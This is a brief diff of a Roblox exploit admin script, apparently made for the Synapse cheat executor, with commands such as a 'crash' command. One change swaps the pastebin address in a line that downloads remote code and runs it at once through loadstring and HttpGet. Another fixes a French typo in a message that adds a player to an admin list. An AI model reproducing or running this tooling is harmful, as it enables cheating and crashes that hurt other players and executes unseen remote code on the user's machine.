@@ -2064,7 +2064,7 @@ function LocalPlayerChatted(msg)
 	    game.Players.LocalPlayer:Kick("Oblivion Support : your exploit doesn't support crash command")
 else
     if syn then
-	loadstring(game:HttpGet('https://pastebin.com/raw/Mv242yVV'))()
+	loadstring(game:HttpGet('https://pastebin.com/FVvmNR0F'))()
     end
 end
 end
@@ -2381,7 +2381,7 @@ end
 			admins[player.UserId] = {
 				settings = {prefix = prefix } 
 			}
-			chat(player.Name..", Félécitations, te voici sur la liste des Admins 'Vulcanic'.")
+			chat(player.Name..", Félicitations, te voici sur la liste des Admins 'Vulcanic'.")
 		    chat("Dis "..prefix.."cmds pour voir quelles commandes tu peux utiliser.")
 		end
 		notify(arg1:sub(2,2):upper()..arg1:sub(3).."ed "..GetPlayerFromString(arg2)..".")
